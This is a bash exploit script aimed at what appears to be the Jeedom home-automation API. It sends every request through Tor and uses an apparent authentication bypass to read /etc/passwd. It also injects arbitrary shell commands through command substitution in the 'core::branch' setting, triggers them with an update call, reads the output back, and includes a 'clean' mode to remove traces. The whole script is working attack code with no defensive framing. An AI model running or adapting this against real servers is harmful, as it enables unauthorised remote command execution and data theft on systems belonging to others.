
echo "Attack on $1"

if [[ $2 == "check" ]] ; then

echo "Checking AuthBypass And File Read /etc/passwd"
timeout 5 torify curl -skX POST $1/core/api/jeeApi.php -d '{"jsonrpc":"2.0", "method":"log::get", "params":{"log":"/etc/passwd", "start":"", "nbLine":100, "apikey":0, "api":0,"proapi":0}}'
echo ""
echo ""

exit
fi

if [[ $2 == "read" ]] ; then



echo "Checking The 'core::branch' Parameter And Reading Output in /tmp/a"




timeout 5 torify curl -skX POST $1/core/api/jeeApi.php -d "{\"jsonrpc\":\"2.0\", \"method\":\"config::byKey\", \"params\":{\"key\":\"core::branch\", \"apikey\":0, \"api\":0, \"proapi\":0}}"


echo ""

timeout 5 torify curl -skX POST $1/core/api/jeeApi.php -d '{"jsonrpc":"2.0", "method":"log::get", "params":{"log":"/tmp/a", "start":"", "nbLine":100, "apikey":0, "api":0,"proapi":0}}'

echo ""
exit
fi

if [[ $2 == "clean" ]] ; then

echo "Cleaning..."

timeout 5 torify curl -skX POST $1/core/api/jeeApi.php -d "{\"jsonrpc\":\"2.0\", \"method\":\"config::save\", \"params\":{\"key\":\"core::branch\", \"value\":\"\$(sudo rm /tmp/a)\", \"apikey\":0, \"api\":0, \"proapi\":0}}"
echo ""
sleep 3
timeout 5 torify curl -skX POST $1/core/api/jeeApi.php -d "{\"jsonrpc\":\"2.0\", \"method\":\"jeedom::update\", \"params\":{\"apikey\":0, \"api\":0,\"proapi\":0}}"
echo ""

sleep 10
timeout 5 torify curl -skX POST $1/core/api/jeeApi.php -d "{\"jsonrpc\":\"2.0\", \"method\":\"config::save\", \"params\":{\"key\":\"core::branch\", \"value\":\"V4-stable\", \"apikey\":0, \"api\":0, \"proapi\":0}}"
echo ""
sleep 3
timeout 5 torify curl -skX POST $1/core/api/jeeApi.php -d '{"jsonrpc":"2.0", "method":"log::get", "params":{"log":"/tmp/a", "start":"", "nbLine":100, "apikey":0, "api":0,"proapi":0}}'
echo ""

timeout 5 torify curl -skX POST $1/core/api/jeeApi.php -d "{\"jsonrpc\":\"2.0\", \"method\":\"config::byKey\", \"params\":{\"key\":\"core::branch\", \"apikey\":0, \"api\":0, \"proapi\":0}}"
echo ""
echo "All Clear..."
exit
fi 

if [[ $2 == "exec" ]] ; then

echo "Planting Payload \"$3\" And Wait 3 sec To Let It Eat The Input"

timeout 5 torify curl -skX POST $1/core/api/jeeApi.php -d "{\"jsonrpc\":\"2.0\", \"method\":\"config::save\", \"params\":{\"key\":\"core::branch\", \"value\":\"\$($3 >/tmp/a)\", \"apikey\":0, \"api\":0, \"proapi\":0}}"
echo ""

sleep 3

echo ""
echo "Triggering Payload And Wait 15 sec For Output"


timeout 5 torify curl -skX POST $1/core/api/jeeApi.php -d "{\"jsonrpc\":\"2.0\", \"method\":\"jeedom::update\", \"params\":{\"apikey\":0, \"api\":0,\"proapi\":0}}"
echo ""
sleep 15

echo ""
echo "Reading Output in /tmp/a"

timeout 5 torify curl -skX POST $1/core/api/jeeApi.php -d '{"jsonrpc":"2.0", "method":"log::get", "params":{"log":"/tmp/a", "start":"", "nbLine":100, "apikey":0, "api":0,"proapi":0}}'

echo ""

exit
fi

echo "Read The Code"
